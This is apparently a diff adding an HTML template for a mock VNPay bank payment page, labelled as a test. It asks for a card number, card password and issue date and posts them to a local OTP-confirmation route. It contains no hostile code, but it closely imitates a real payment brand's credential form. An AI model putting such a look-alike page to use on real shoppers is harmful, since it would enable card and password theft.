@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <title>Thanh toán VNPay - {{ bank.name }}</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    body {
+      background: #f2f3f7;
+      margin: 0;
+      font-family: 'Arial', sans-serif;
+    }
+    .payment-container {
+      max-width: 1000px;
+      margin: 40px auto;
+      border-radius: 10px;
+      overflow: hidden;
+      box-shadow: 0 8px 25px rgba(0,0,0,0.1);
+      background: #fff;
+    }
+    .header {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 15px 20px;
+      border-bottom: 1px solid #eee;
+      background: #f8f9fa;
+    }
+    .header img {
+      height: 60px;
+    }
+    .content {
+      display: flex;
+      flex-wrap: wrap;
+      padding: 30px;
+      gap: 20px;
+    }
+    .order-info, .payment-form {
+      flex: 1;
+      min-width: 300px;
+      padding: 20px;
+      border-radius: 8px;
+      background: #fafafa;
+      box-shadow: inset 0 0 5px rgba(0,0,0,0.03);
+    }
+    .order-info h5, .payment-form h5 {
+      margin-bottom: 25px;
+      font-weight: 600;
+      color: #333;
+    }
+    .label-text {
+      color: #888;
+      font-size: 13px;
+    }
+    .amount {
+      font-size: 28px;
+      font-weight: bold;
+      color: #007bff;
+    }
+    .value-text {
+      font-size: 16px;
+      font-weight: 500;
+      color: #000;
+    }
+    .form-control:focus {
+      border-color: #007bff;
+      box-shadow: none;
+    }
+    .btn-continue {
+      background: linear-gradient(90deg,#007bff,#0056b3);
+      color: white;
+      font-weight: bold;
+      border-radius: 5px;
+      padding: 10px 0;
+      transition: 0.3s;
+    }
+    .btn-continue:hover {
+      background: linear-gradient(90deg,#0056b3,#003f7f);
+    }
+    .footer-info {
+      margin-top: 20px;
+      font-size: 14px;
+      text-align: center;
+      color: #555;
+    }
+    .terms {
+      margin-top: 15px;
+      font-size: 12px;
+      text-align: center;
+      color: #aaa;
+      line-height: 1.5;
+    }
+    .ncb-logo {
+      position: absolute;
+      right: 10px;
+      top: 38px;
+      height: 22px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="payment-container">
+  <!-- Header -->
+  <div class="header">
+    <img src="/static/logo/vnpay.jpg" alt="VNPay">
+  </div>
+
+  <div class="content">
+    <!-- Cột trái -->
+    <div class="order-info">
+      <h5>Thông tin đơn hàng (Test)</h5>
+      <p>
+        <span class="label-text">Số tiền thanh toán:</span><br>
+        <span class="value-text amount">{{ "{:,.2f}".format(amount) }} $</span>
+      </p>
+      <hr>
+      <p>
+        <span class="label-text">Giá trị đơn hàng:</span><br>
+        <span class="value-text">{{ "{:,.2f}".format(amount) }} $</span>
+      </p>
+      <p>
+        <span class="label-text">Phí giao dịch:</span><br>
+        <span class="value-text">0 $</span>
+      </p>
+      <p>
+        <span class="label-text">Mã đơn hàng:</span><br>
+        <span class="value-text">{{ transaction_code }}</span>
+      </p>
+      <p>
+        <span class="label-text">Nhà cung cấp:</span><br>
+        <span class="value-text"><a href="https://vnshop.vn">https://vnshop.vn</a></span>
+      </p>
+    </div>
+
+    <!-- Cột phải -->
+    <div class="payment-form">
+      <h5>Thanh toán qua Ngân hàng {{bank.name}}</h5>
+      <form method="POST" action="/confirm_otp">
+        <div class="mb-3 position-relative">
+          <label class="form-label">Số thẻ</label>
+          <input type="text" class="form-control" name="card_number" placeholder="Nhập số thẻ">
+          <img src="{{bank.logo}}" class="ncb-logo">
+        </div>
+        <div class="mb-3">
+          <label class="form-label">Mật khẩu</label>
+          <input type="password" class="form-control" name="password" placeholder="Nhập mật khẩu">
+        </div>
+        <div class="mb-3">
+          <label class="form-label">Ngày phát hành</label>
+          <input type="month" class="form-control" name="expiry_date">
+        </div>
+        <div class="mb-3">
+          <label class="form-label">Mã khuyến mại</label>
+          <input type="text" class="form-control" name="promo_code" placeholder="Nhập mã (nếu có)">
+        </div>
+        <button type="submit" class="btn btn-continue w-100">Tiếp tục</button>
+      </form>
+
+      <div class="footer-info">
+        Hotline: 1900.5555.77 | Email: hotrovnpay@ncb.vn
+      </div>
+
+      <div class="terms">
+        <p>Giao dịch được thực hiện qua hệ thống VNPay. Mọi thông tin thẻ và mật khẩu của khách hàng được bảo mật tuyệt đối. <br>
+        Quý khách vui lòng kiểm tra kỹ thông tin trước khi thanh toán. VNPay không chịu trách nhiệm với các lỗi do nhập sai thông tin.</p>
+      </div>
+    </div>
+  </div>
+</div>
+</body>
+</html>
